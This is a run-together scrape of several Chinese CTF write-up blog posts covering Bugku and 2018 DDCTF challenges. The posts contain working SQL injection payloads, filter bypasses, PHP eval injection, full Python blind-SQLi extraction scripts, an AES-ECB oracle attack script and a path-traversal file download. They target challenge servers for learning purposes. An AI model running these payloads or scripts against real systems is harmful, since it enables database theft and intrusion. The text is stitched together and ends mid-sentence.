MISClinux基础问题&emsp;&emsp;将压缩包下载后可以发现一个flag文件，拿到010Editor查找flag却没有任何发现，后来使用winhex查找flag，发现了flag.txt，但这并没有什么用，所以再次查找key，此时就能找到flag。flag：key{feb81d3834e2423c9903f4755464060b} 中国菜刀&emsp;&emsp;下载压缩文件后可以发现是wireshark的捕获包，使用wireshark分析，追踪TCP流可以发现有一段流比较奇怪。 &emsp;&emsp;将传输的数据拿去进行base64解密可以得知这个流是读取flag的数据流。 &emsp;&emsp;所以将这个蓝色部分的数据提取出来 &emsp;&emsp;调整数据流后再选择解码类型。 &emsp;&emsp;所以flag：key{8769fe393f2b998fa6a11afe2bfcd65e}### 这么多数据包&emsp;&emsp;下载后用wireshark打开，将进度条下拉到灰色（传输稳定）的状态，选择一条，然后追踪TCP流， &emsp;&emsp;调节流，在1735就有发现，将那串字符进行base64解码后可以发现。 &emsp;&emsp;所以flag：CCTF{do_you_like_sniffer}### Linux2&emsp;&emsp;题目描述：12给你点提示吧：key的格式是KEY{}题目地址：链接: http://pan.baidu.com/s/1skJ6t7R 密码: s7jy&emsp;&emsp;将文件下载后使用binwalk、foremost可以分离出一个看似是flag的图片，但提交却是错误。无奈只能换种思路，自己想了挺久没想出来，后来查了下writeup才发现正确的解题方式：使用strings brave分析文件。 &emsp;&emsp;所以flag：KEY{24f3627a86fc740a7f36ee2c7a1c124a}## WEB### sql注入&emsp;&emsp;题目描述： &emsp;&emsp;在测试的时候发现不管’还是”都无法判断是否存在注入，查看源代码发现页面使用gb2312，所以考虑宽字节注入，。 1POC: id=1%df%27 and 1=1 -- + &emsp;&emsp;但在查询string的值时发生如下错误 &emsp;&emsp;尝试将key使用反引号包围，即`key`。最终得到flag。 &emsp;&emsp;所以flag：KEY{54f3320dc261f313ba712eb3f13a1f6d}&emsp;&emsp;后来查阅了资源，sqlmap进行宽字节注入的payload如下：1python2 sqlmap.py -u http://103.238.227.13:10083/?id=1%df%27### 域名解析&emsp;&emsp;题目描述：&gt;听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag&emsp;&emsp;windows下修改本地hosts解析的方法是修改C:\\Windows\\System32\\drivers\\etc下的hosts文件，注意要用管理员身份修改。 &emsp;&emsp;在里面增加一条记录即可，然后访问flag.bugku.com，即可得到flag。 SQL注入测试&emsp;&emsp;题目描述： 访问参数为：?id=x查找表为key的数据表，id=1值hash字段值 &emsp;&emsp;过滤代码1234567891011121314//过滤sql$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');foreach ($array as $value){ if (substr_count($id, $value) &gt; 0) { exit('包含敏感关键字！'.$value); }}//xss过滤$id = strip_tags($id);$query = \"SELECT * FROM temp WHERE id={$id} LIMIT 1\"; &emsp;&emsp;可以看出过滤得很严格，但致命的缺陷是$id = strip_tags($id);，它给了我们一丝可乘之机。strip_tags可以过滤掉html、xml、php中的标签，比如将a&lt;a&gt;nd过滤成and。 &emsp;&emsp;所以payload：1http://103.238.227.13:10087/?id=-1 u&lt;a&gt;nion se&lt;a&gt;lect hash,2 f&lt;a&gt;rom `key` where id=1 -- + &emsp;&emsp;flag： KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef} 本地包含&emsp;&emsp;题目描述：1234567echo '2333，不只是本地文件包含哦~'; &lt;?php include \"waf.php\"; include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__); ?&gt; &emsp;&emsp;这里一开始踏进了一个坑，测试的时候使用了1)&quot;;echo 111;//，但没有任何回显。 &emsp;&emsp;看了writeup后才发现&quot;是多余的。 &emsp;&emsp;在eval()中可以使用print_r(file(&quot;xxx&quot;))的形式读取文件，所以payload就是：1);print_r(file(&quot;flag.php&quot;));// 变量1&emsp;&emsp;题目描述：12345678910111213flag In the variable ! &lt;?php error_reporting(0);include \"flag1.php\";highlight_file(__file__);if(isset($_GET['args'])){ $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args)){ die(\"args error!\"); } eval(\"var_dump($$args);\");}?&gt; &emsp;&emsp;这里由于正则只匹配字母，不允许有;之类的符号出现，所以用上一道题的payload是没法获得flag的。但好在存在$$args，可以为我们打开另一道窗。 &emsp;&emsp;这里介绍一个php中的特殊变量: $GLOBALS，它的作用如下： &emsp;&emsp;所以我们可以利用$GLOBALS输出flag的值，故payload：http://120.24.86.145:8004/index1.php?args=GLOBALS。 备份是个好习惯&emsp;&emsp;题目描述： http://120.24.86.145:8002/web16/听说备份是个好习惯 &emsp;&emsp;访问index.php.bak可以下载源码1234567891011121314&lt;?phpinclude_once \"flag.php\";ini_set(\"display_errors\", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){ echo $flag.\"取得flag\";}?&gt; &emsp;&emsp;这里说下$_SERVER['REQUEST_URI']和parse_str($str)的作用，12345678访问：http://localhost/aaa/?p=222$_SERVER['REQUEST_URI'] = \"/aaa/?p=222\";&lt;?phpparse_str(\"name=Bill&amp;age=60\");echo $name.\"&lt;br&gt;\"; // Billecho $age; // 60?&gt; &emsp;&emsp;接下来介绍两个绕过md5检查的方法 一：使用数组的形式绕过&emsp;&emsp;&emsp;&emsp;因为MD5不能处理数组，MD5在对数组进行加密时会返回false（null?），false==false无疑是成立的，所以可以构造?a[]=1&amp;b[]=2之类的方法绕过检查。所以，payload1如下： 二：找到两个md5加密后相同的值&emsp;&emsp;&emsp;&emsp;这个要考积累，这里我找到了两个值。?key1=QNKCDZO&amp;key2=240610708。 秋名山老司机&emsp;&emsp;题目描述： 亲请在2s内计算老司机的车速是多少1741242492-1033554030-217864531-2107975482+1148641444-1741096300+174362695137826373521637778+861571530+717037212=?; &emsp;&emsp;附上python脚本如下，这里重要的函数是eval()：1234567891011121314# -*- coding:utf-8 -*-import requestsfrom bs4 import BeautifulSoupurl='http://120.24.86.145:8002/qiumingshan/'r=requests.session()requestpage = r.get(url)soup = BeautifulSoup(requestpage.content, 'lxml')ans=soup.select('div')[0].get_text()[:-3]print(ans)post=eval(ans)#计算表达式的值data={'value':post}#构造post的data部分flag=r.post(url,data=data)print(flag.text) 速度要快&emsp;&emsp;题目描述： &emsp;&emsp;要注意的是margin，这是一个数字，这也是后面的一个小坑。&emsp;&emsp;用burpsuite抓包可以发现，http的头部有flag，并且一看就是base64编码过的。 &emsp;&emsp;最后的脚本：1234567891011121314151617# -*- coding:utf-8 -*-import requestsimport base64url = 'http://120.24.86.145:8002/web6/'r = requests.session()html = r.get(url)bs = html.headers['flag']key = base64.b64decode(bs)key = str(key, encoding='utf-8')print(key)key = key.split(' ')[1]key = str(base64.b64decode(key), encoding='utf-8')print(key)data = {'margin':key}html = r.post(url, data)print(html.text)&emsp;&emsp;要注意的是，后面的一串还要进行一次base64解码才能得到数字。","link":"/2018/03/bugku-ctf-writeup1/"},{"title":"Bugku writeup3","text":"WebINSERT INTO注入&emsp;&emsp;题目描述：123456789101112131415function getIp(){$ip = '';if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];}else{$ip = $_SERVER['REMOTE_ADDR'];}$ip_arr = explode(',', $ip);return $ip_arr[0];}$ip = getIp();echo 'your ip is :'.$ip;$sql=\"insert into client_ip (ip) values ('$ip')\";mysql_query($sql); &emsp;&emsp;可以看到，这是X-Forwarded-For的注入，而且过滤了逗号,。在过滤了逗号的情况下，我们就不能使用if语句了，在mysql中与if有相同功效的就是：1select case when xxx then xxx else xxx end; &emsp;&emsp;而且由于逗号,被过滤，我们就不能使用substr、substring了，但我们可以使用：from 1 for 1，所以最终我们的payload如下：1127.0.0.1&apos;+(select case when substr((select flag from flag) from 1 for 1)=&apos;a&apos; then sleep(5) else 0 end))-- + &emsp;&emsp;相应的python代码为：1234567891011121314151617181920212223# -*- coding:utf-8 -*-import requestsimport sys# 基于时间的盲注，过滤了逗号 ,sql = \"127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)='{1}' then sleep(5) else 0 end))-- +\"url = 'http://120.24.86.145:8002/web15/'flag = ''for i in range(1, 40): print('正在猜测：', str(i)) for ch in range(32, 129): if ch == 128: sys.exit(0) sqli = sql.format(i, chr(ch)) # print(sqli) header = { 'X-Forwarded-For': sqli } try: html = requests.get(url, headers=header, timeout=3) except: flag += chr(ch) print(flag) break &emsp;&emsp;跑出flag：flag{cdbf14c9551d5be5612f7bb5d2867853} 这是一个神奇的登陆框&emsp;&emsp;打开网站后进行抓包，进过测试后发现是基于时间的盲注，POC:aaa&quot; or sleep(5) -- +。所以写个脚本跑一下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223# -*- coding:utf-8 -*-import requests'''这篇POC: aaa\" or sleep(5) -- +源于Bugku：http://120.24.86.145:9001/sql/场景：登陆框基于时间的盲注'''url = 'http://120.24.86.145:9001/sql/'def fuzz(sql, test, pos1, pos2, tmp): left = 32 right = 127 while True: mid = (left + right) // 2 print('正在测试字符：' + str(mid) + ' ----&gt; ' + chr(mid)) test3 = test.format(pos1-1, pos2, mid) params = { 'admin_name': 'admin', 'admin_passwd': test3, 'submit': 'GO+GO+GO' } try: html = requests.post(url, params, timeout=3) except: tmp += chr(mid) return tmp sqli = sql.format(pos1-1, pos2, mid) params = { 'admin_name': 'admin', 'admin_passwd': sqli, 'submit': 'GO+GO+GO' } try: html = requests.post(url, params, timeout=3) right = mid except: left = mid# database = ''# sql = \"1\\\" or if(ascii(substr(database(),{0},1))&gt;{1},sleep(5),0) -- +\"# test = \"1\\\" or if(ascii(substr(database(),{0},1))={1},sleep(5),0) -- +\"# for pos in range(1, 50):# # 测试length(database())，一旦超过长度则不用再执行。# is_end = sql.format(pos, 1)# params = {# 'admin_name': 'admin',# 'admin_passwd': is_end,# 'submit': 'GO+GO+GO'# }# try:# html = requests.post(url, params, timeout=3)# print('======================')# print('[*]database: ', database)# print('======================\\n')# break# except:# pass## left = 32# right = 127# while True:# mid = (left + right) // 2# # print('正在测试字符：', str(mid))# test3 = test.format(pos, mid)# params = {# 'admin_name': 'admin',# 'admin_passwd': test3,# 'submit': 'GO+GO+GO'# }# try:# html = requests.post(url, params, timeout=3)# except:# database += chr(mid)# print('[+]database: ', database)# break## sqli = sql.format(pos, mid)# params = {# 'admin_name': 'admin',# 'admin_passwd': sqli,# 'submit': 'GO+GO+GO'# }# try:# html = requests.post(url, params, timeout=3)# right = mid# except:# left = midtables_name = {}sql = \"1\\\" or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),{1},1)))&gt;{2},sleep(5),0) -- +\"test = \"1\\\" or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),{1},1)))={2},sleep(5),0) -- +\"for table_num in range(1, 20): sqli = sql.format(table_num - 1, 1, 1) params = { 'admin_name': 'admin', 'admin_passwd': sqli, 'submit': 'GO+GO+GO' } try: html = requests.post(url, params, timeout=3) print('[*]已无其他表！') break except: print('[+]正在爆破表', str(table_num)) table = '' for str_num in range(1, 50): # 测试length(database())，一旦超过长度则不用再执行。 test2 = sql.format(table_num - 1, str_num, 1) params = { 'admin_name': 'admin', 'admin_passwd': test2, 'submit': 'GO+GO+GO' } try: html = requests.post(url, params, timeout=3) print('======================') print('[*]table: ', table) tables_name[table_num] = table print('======================\\n') break except: pass table = fuzz(sql, test, table_num, str_num, table) print('[+]table: ', table)print('******************')for key in tables_name: print('[*]table' + str(key) + ': ' + tables_name[key])print('******************\\n')tb = int(input('&gt;请选择需要爆破的表(数字)：'))# for tb in tables_name:sql = \"1\\\" or if((ascii(substr((select column_name from information_schema.columns where table_name='\" + tables_name[tb]+ \"' limit {0},1),{1},1)))&gt;{2},sleep(5),0) -- +\"test = \"1\\\" or if((ascii(substr((select column_name from information_schema.columns where table_name='\" + tables_name[tb]+ \"' limit {0},1),{1},1)))={2},sleep(5),0) -- +\"colunms_name = {}for column_num in range(1, 20): sqli = sql.format(column_num - 1, 1, 1) params = { 'admin_name': 'admin', 'admin_passwd': sqli, 'submit': 'GO+GO+GO' } try: html = requests.post(url, params, timeout=3) print('[*]已无其他字段！') break except: print('[+]正在爆破字段', str(column_num)) column = '' for str_num in range(1, 50): # 测试length(database())，一旦超过长度则不用再执行。 test2 = sql.format(column_num - 1, str_num, 1) params = { 'admin_name': 'admin', 'admin_passwd': test2, 'submit': 'GO+GO+GO' } try: html = requests.post(url, params, timeout=3) print('======================') print('[*]column: ', column) colunms_name[column_num] = column print('======================\\n') break except: pass column = fuzz(sql, test, column_num, str_num, column) print('[+]column: ', column)print('******************')for key in colunms_name: print('[*]column' + str(key) + ': ' + colunms_name[key])print('******************\\n')cl = int(input('&gt;请选择需要爆破的字段(数字)：'))sql = \"1\\\" or if((ascii(substr(( select \" + colunms_name[cl] + \" from \" + tables_name[tb]+ \" limit {0},1),{1},1)))&gt;{2},sleep(5),0) -- +\"test = \"1\\\" or if((ascii(substr(( select \" + colunms_name[cl] + \" from \" + tables_name[tb]+ \" limit {0},1),{1},1)))={2},sleep(5),0) -- +\"key = []for num in range(1, 20): sqli = sql.format(num - 1, 1, 1) params = { 'admin_name': 'admin', 'admin_passwd': sqli, 'submit': 'GO+GO+GO' } try: html = requests.post(url, params, timeout=3) print('[*]已无其他数据！') break except: print('[+]正在爆破数据', str(num)) tmp_key = '' for str_num in range(1, 50): # 测试length(database())，一旦超过长度则不用再执行。 test2 = sql.format(num - 1, str_num, 1) params = { 'admin_name': 'admin', 'admin_passwd': test2, 'submit': 'GO+GO+GO' } try: html = requests.post(url, params, timeout=3) print('======================') print('[*]column: ', tmp_key) key.append(tmp_key) print('======================\\n') break except: pass tmp_key = fuzz(sql, test, num, str_num, tmp_key) print('[+]key: ', tmp_key)print('******************')for tt in key: print('[*]key: ' + tt)print('******************\\n') 多次&emsp;&emsp;打开网页后在?id=1后面加个'号，发现错误，然后再添加一个'，发现可以闭合。 &emsp;&emsp;然后测试了一下，发现and or &amp;&amp;被过滤掉了，但||和位注入| ^没有被过滤。当使用?id=0' || 1=2 -- +时是返回错误，而?id=0' || 1=1 -- +返回了正确，所以这里存在注入。这里值得注意的是，我使用id=0而不是id=1等非0值，这是因为任何大于0的数进行||都会返回真。 &emsp;&emsp;这里还有一种判断是否存在注入的方式就是使用异或进行注入，如：?id=0' ^ (1=2) ^ '。 &emsp;&emsp;因为在使用and的时候发现是返回了错误，所以猜测后台过滤了一些字符，所以可以使用?id=0' || length('and')=0 -- +检查一下过滤了的函数，如： &emsp;&emsp;进过一番测试后可以发现是一次替换的方法进行过滤的，因为可以看到当双写了以后它返回的长度是原来字符的长度。如：0' || length('aandnd')=3 -- +返回真。 &emsp;&emsp;然后我们检查下字段数，构造payload：?id=1' oorrder by 2 -- +，可以发现字段数为2。 &emsp;&emsp;然后再看显位，构造payload：?id=-1' uniounionn seleselectct 1,2 -- +。 &emsp;&emsp;获得表名：ununionion seleselectct 1,table_name from infoorrmation_schema.tables where table_schema=database() limit 0,1-- + &emsp;&emsp;可以得到表：flag1、hint，两张表。&emsp;&emsp;然后我们读flag1的字段：ununionion seleselectct 1,column_name from infoorrmation_schema.columns where table_name=0x666c616731 limit 0,1-- + &emsp;&emsp;然后我们能得到两列：flag1、address。然后查询flag：ununionion seleselectct 1,flag1 from flag1 -- + &emsp;&emsp;我们得到一串字符拿去提交后却发现并不是正确答案，所以我们再看一下address是什么。 &emsp;&emsp;这里我们得到了下一关的地址。打开后页面如下： &emsp;&emsp;然后我们再使用上面的套路进行探测，最后我们能发现双写已经不能绕过了，但是却没有过滤if left benchmark select from函数，所以，我们可以使用基于时间的盲注进行注入。payload：1?id=1&apos; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&apos;a&apos;, benchmark(7000000,MD5(14545)), 0) %23 &emsp;&emsp;剩下的爆字段跟值就不一一写了，这里直接写了个脚本：1234567891011121314151617181920212223# -*- coding:utf-8 -*-from time import sleepimport requestsurl = \"http://120.24.86.145:9004/Once_More.php?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0})='{1}', benchmark(7000000,MD5(14545)), 0) %23\"# url = \"http://120.24.86.145:9004/Once_More.php?id=1' and if(left((select column_name from information_schema.columns where table_name=0x666c616732 limit 0,1),{0})='{1}', benchmark(7000000,MD5(14545)), 0) %23\"# url = \"http://120.24.86.145:9004/Once_More.php?id=1' and if(left((select flag2 from flag2),{0})='{1}', benchmark(40000000,MD5(14545)), 0) %23\"database = ''for i in range(28, 50): for j in range(32, 128): tmp = database + chr(j) print('正在尝试：', tmp) urli = url.format(i, tmp) # print(urli) try: html = requests.get(urli, timeout=3) except: database += chr(j) print('[+]column: ', database) breakprint(database) &emsp;&emsp;只要把payload一换就可以使用，不过可能需要多次执行。最终flag：flag{bugku-sql_6s-2i-4t-bug}，这里要说的就是left在比较的时候是不区分大小写的，所以一般flag要么大写要么小写，而这道题原本的flag把bugku中的b弄成了大写B，所以一开始提交答案不对，后来经过跟管理员联系后，管理员就把flag都改成小写了。 &emsp;&emsp;这里的另一种解法就是使用locate()进行bool型注入，payload：id=1' and (select LOCATE('a',(select flag2 from flag2)))=1 -- +，这里需要变的就是locate()的第一个参数，后面的1不要变，因为它返回的是第一个字符串参数出现在第二个字符串参数中的位置，我们把它置为1就是希望从头开始爆破。脚本如下：123456789101112131415# -*- coding:utf-8 -*-import requestsurl = \"http://120.24.86.145:9004/Once_More.php?id=1' and (select LOCATE('{}',(select flag2 from flag2)))=1 -- +\"database = ''for i in range(1, 50): for j in range(32, 128): tmp = database + chr(j) print('正在尝试：', tmp) urli = url.format(tmp) html = requests.get(urli) if 'Hello' in html.text: database += chr(j) print('[+]key: ', database) break","link":"/2018/03/bugku-writeup3/"},{"title":"2018 DDCTF 杂项 writeup","text":"前言&emsp;&emsp;今年的DDCTF玩的非常充实，7天的时间里基本每天都在学习新东西，整个Writeup会按题目类型进行分类。 (╯°□°）╯︵ ┻━┻&emsp;&emsp;签到题就直接pass了，从第二道开始。题目就给出了一串16进制的字符：1d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd &emsp;&emsp;一开始是想看看是不是什么文件的，但没有发现。 &emsp;&emsp;而且观察发现按两位数转10进制的话全都超出了可见字符的ASCII码表，当然解题时也考虑过对每两个16进制进行^异或，但都不对。然后尝试对每两个字符转出来的10进制进行减128，因为这样每个值得范围就能落在ASCII码表。123456789import resss = 'd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd'nums = re.findall('\\w{2}',sss)flag = ''for one in nums: ch = chr(int(one,16) - 128) flag += chprint(flag)# That was fast! The flag is: DDCTF{922ab9974a47cd322cf43b50610faea5} 第四扩展FS&emsp;&emsp;附件下下来发现很大，用winhex查看了一下，发现后面全是填充的，然后还有个压缩包，我们把它提取出来，但需要解压密码，然后解压密码可以在原图片的备注信息里找到。 &emsp;&emsp;接着我们就能拿到一堆乱码的字符。 &emsp;&emsp;因为题目描述中说到频次很重要，所以尝试使用在线的词频密码分析网站，但没有发现，所以考虑另一种可能，就是不用还原成句子，只需要里面的每个词的频次。然后写个脚本跑一下：123456789101112131415161718# -*- coding:utf-8 -*-with open ('file.txt','r') as f: dd3 = f.read()a = {}for i in dd3: if i not in a: a[i]=1 else: a[i] +=1b = sorted(a.items(), lambda x, y: cmp(x[1], y[1]), reverse=True)flag = ''for i in b: flag += i[0]print(flag)# DCTF{x1n9shaNgbIci} 流量分析&emsp;&emsp;下载后使用wireshark进行分析，流量分析题如果不掌握点小技巧，估计眼睛会看瞎。 &emsp;&emsp;打开后直接拉到灰色报文块，如下图，然后一把TCP追踪流过去。 &emsp;&emsp;然后逐个查看流，然后你会发现有两个压缩包，但后面发现那就是坑来的，反正我没用上。。。。在查看他们的邮件往来记录的时候有一张图片引起了我的注意： &emsp;&emsp;恢复过来后看起来比较奇怪，，因为以前也没搞过密码，所以一开始还真没注意到它的作用。 &emsp;&emsp;接着再往下走，有一个地方引起了我的注意。 &emsp;&emsp;TLSv1.2是https上使用的，后面的传输数据都会被服务器的私钥进行加密，然后这时想起上面得到的那张图片，就联系起来了。百度了一下在wireshark里还原https数据的方法：传送门。按照这里的方法进行恢复，然后就能拿到flag了。 &emsp;&emsp;PS一下：这里对我提取出来的文件进行md5，但都没有得到题目中给的那个值。。。 安全通信&emsp;&emsp;题目描述：1请通过nc 116.85.48.103 5002答题，mission key是f49348cf84d390da52498077ae7137d5，agent id随意填就可以 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env pythonimport sysimport jsonfrom Crypto.Cipher import AESfrom Crypto import Randomdef get_padding(rawstr): remainder = len(rawstr) % 16 if remainder != 0: return '\\x00' * (16 - remainder) return ''def aes_encrypt(key, plaintext): plaintext += get_padding(plaintext) aes = AES.new(key, AES.MODE_ECB) cipher_text = aes.encrypt(plaintext).encode('hex') return cipher_textdef generate_hello(key, name, flag): message = \"Connection for mission: {}, your mission's flag is: {}\".format(name, flag) return aes_encrypt(key, message)def get_input(): return raw_input()def print_output(message): print(message) sys.stdout.flush()def handle(): print_output(\"Please enter mission key:\") mission_key = get_input().rstrip() print_output(\"Please enter your Agent ID to secure communications:\") agentid = get_input().rstrip() rnd = Random.new() session_key = rnd.read(16) flag = '&lt;secret&gt;' print_output(generate_hello(session_key, agentid, flag)) while True: print_output(\"Please send some messages to be encrypted, 'quit' to exit:\") msg = get_input().rstrip() if msg == 'quit': print_output(\"Bye!\") break enc = aes_encrypt(session_key, msg) print_output(enc)if __name__ == \"__main__\": handle() &emsp;&emsp;这道题考的是aes ecb的攻击方法，经过一通google后找到了一个比较有参考意义的writeup，传送门。 &emsp;&emsp;需要了解的是ECB是分组加密的（一组16个字符），也就是一块一块的，这点是我们后续攻击的重要前提。 &emsp;&emsp;然后我们看一下他这个脚本，经过分析后我们可以发现加密的消息的长度我们是可以控制的。 &emsp;&emsp;而且对于一次连接，在同一密钥的情况下，我们可以随意加密任何数据任何次。 &emsp;&emsp;所以攻击手段就很清晰了。1234567明文分组(16个字符) 对于的密文(对得到的一长串密文进行32位切割)Connection for m ----&gt; eae138090c7a60d97a6c54ce15fe7888 # 第1块ission: 12345678 ----&gt; aaaab01d2ba84861447153e790047db4 # 第2块90123, your miss ----&gt; d9d2a15efa5c6f75097d89f1e5cc629c # 第3块ion&apos;s flag is: D ----&gt; 8e16cf020a37e52a28fdee32d469c2b4 # 第4块DCTF{afafjafj101 ----&gt; 5ca9b0e48d1dec7bb06a73dd163380a0 # 第5块..... &emsp;&emsp;如上所示，我们可以控制name的长度来使（在这种情况下）第4块的最后一个字符是flag中我们要求的第一个字符，而它明文的前15个字符我们是知道的，密文我们也知道，所以我们可以使用这样来暴力猜测出最后一位到底是什么。1234567# 伪代码raw = 'ion's flag is: 'for ch in range(33,128): tmp = raw + chr(ch) my_miwen = encrypt(tmp) if my_miwen == true_miwen: print('要求的是：',tmp) &emsp;&emsp;所以只要我们设计好填充的长度就能将flag的所有字符都爆破出来。填充的时候有一个需要注意的地方就是块的推进（进位），因为你不能无限制退后，所以当我们用完填充块的大小后要更新需要爆破的块。代码如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# coding:utf-8import socket # 导入 socket 模块import resc = Nonec = '-'def sendAgent(agent): global sc sc = socket.socket() # 创建 socket 对象 host = \"116.85.48.103\" # 获取本地主机名 port = 5002 # 设置端口 addr = (host, port) sc.connect(addr) # 绑定端口号 sc.recv(1024) # 打印接收的数据 sc.send('f49348cf84d390da52498077ae7137d5\\n') sc.recv(1024) # 打印接收的数据 sc.send(agent+'\\n') return sc.recv(1024)def tryChar(): raw = '0000000000000000' allstr = \"Connection for mission: {}, your mission's flag is: \" while True: # 除去 {}， req = 15 - (len(allstr)-2) % 16 # 求出要填充的长度 raw_t = raw[:req] raw_t_concat = allstr.format(raw_t).replace('-','{',-1).replace('=','}',-1) print(raw_t_concat) rex = re.compile('.{1,16}') # 对明文进行分组 tmp = re.findall(rex, raw_t_concat) print(tmp) rs_len = len(tmp) # 分组长度 rs = tmp[-1] # 要爆破的块(最后一块) print('正在爆破:%s' % rs) # 重新连接 发送Agent = raw_t firstRs = sendAgent(raw_t) block = re.findall('.{32}',firstRs)[rs_len-1] # 拿到密文对应需要爆破的明文分组的一块 # 爆破 for cs in range(33,128): sc.recv(1024) sc.send(rs+ chr(cs)+'\\n') rss = sc.recv(1024).split('\\n') [0] if rss==block: c = chr(cs) allstr+=c.replace('{','-').replace('}', '=') break if c=='}': print('over!') returntryChar() &emsp;&emsp;最后得到flag：DDCTF{87fa2cd38a4259c29ab1af39995be81a}。&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/04/ddctf-writeup1/"},{"title":"2018 DDCTF Web 部分writeup","text":"前言&emsp;&emsp;滴滴的web题感觉质量还是挺高的，因为每一道题自己做得都比较吃力（菜鸟自白）。。。但更重要的是自己也从每道题中学习到了新知识，这种感觉甚至胜过拿到flag的喜悦….. 数据库的秘密&emsp;&emsp;打开网站后进行简单的探索，可以发现有一个隐藏的input表单项，还有前端使用了sha1对传递的数据进行签名和加上时间戳。 &emsp;&emsp;当然最大的障碍是防火墙。 &emsp;&emsp;经过一天的不断尝试和搜索后终于得到了POC，利用方式有两点： 1、使用enctype=”multipart/form-data”方式提交表单防火墙不拦截 2、隐藏的author表项不会对’(单引号)进行转义 &emsp;&emsp;为了让python跑起来我们需要了解它的签名过程，通过js调试后我们可以得到它的签名原理。 &emsp;&emsp;所以我们的python脚本就可以这样写：1234567891011121314151617181920212223242526272829303132333435363738394041424344# -*- coding: utf-8 -*-import requestsimport hashlibimport timesql = 'admin\\' or if(ascii(substr((select secvalue from ctf_key8 limit 0,1),{0},1))={1},sleep(5),0) -- +'hs = 'id=title=author={0}date=time={1}adrefkfweodfsdpiru'url = 'http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig={}&amp;time={}'header = { 'X-Forwarded-For' : '123.232.23.245',}table = ''tt = Truefor i in range(1, 50): if tt: for ch in range(33, 128): # print('now: ' + str(ch)) if ch == 127: tt = False te = str(int(time.time())) sqli = sql.format(i, str(ch)) data = { # 这里是为了生成的form-data的参数是name，如果不加因为是files参数，格 #式化的时候就会变成filename，但这并不是我们想要的，自己实际操作一下就知道了。 'id': (None, ''), 'title': (None, ''), 'author': (None, sqli), 'time': (None, te), } proxies = { \"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\"} sig = hashlib.sha1(hs.format(sqli,te)).hexdigest() t_url = url.format(sig, te) # print(t_url) try: html = requests.post(t_url, files=data, headers=header, timeout=3) except: table += chr(ch) print(table) break else: break &emsp;&emsp;flag：DDCTF{IKIDLHNZMKFUDEQE}。 专属链接&emsp;&emsp;题目描述：1234567现在，你拿到了滴滴平台为你同学生成的专属登录链接，但是你能进一步拿到专属他的秘密flag么提示1：虽然原网站跟本次CTF没有关系，原网站是www.xiaojukeji.com注：题目采用springmvc+mybatis编写，链接至其他域名的链接与本次CTF无关，请不要攻击http://116.85.48.102:5050/welcom/3fca5965sd7b7s4a71s88c7se658165a791e &emsp;&emsp;打开链接后发现并没有什么业务，都是些从原网站挪过来的模板，这里也纠结了好一会，经过一番比对后，可以发现用于标签页的favicon.ico有人为涂抹的痕迹。在源代码中打开后发现就直接下载了。 &emsp;&emsp;用winhex打开后，果然发现了信息。 &emsp;&emsp;通过这个信息，我们可以猜测是源码泄露（文件下载）。而因为网站框架是基于java的spring，它相关的源码泄露可以参考： /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 &emsp;&emsp;但是发现如果直接拼接WEB-INF/web.xml却没有该地址，后来再回去看看下载favicon.ico的链接，发现最后是base64编码过的。 &emsp;&emsp;所以我们猜测需要后面拼接base64编码的字符，我们把../../WEB-INF/web.xml（注意../）进行编码后拼接访问，发现确实可以造成文件下载。下载后就开始了顺藤摸瓜的操作了。 &emsp;&emsp;我们根据得到的applicationContext.xml的位置，继续下载。然后可以从这个文件中得到mybatis/config.xml的地址。 &emsp;&emsp;关于.xml文件的下载就介绍到这，其余的文件按照同样的操作就能找到，注意的地方就是路径。 &emsp;&emsp;接下来就是下载.class文件，从applicationContext.xml中可以发现程序开始运行的接口类（应该可以这样说吧，，，java web不熟）。 &emsp;&emsp;一开始由于没有接触过java 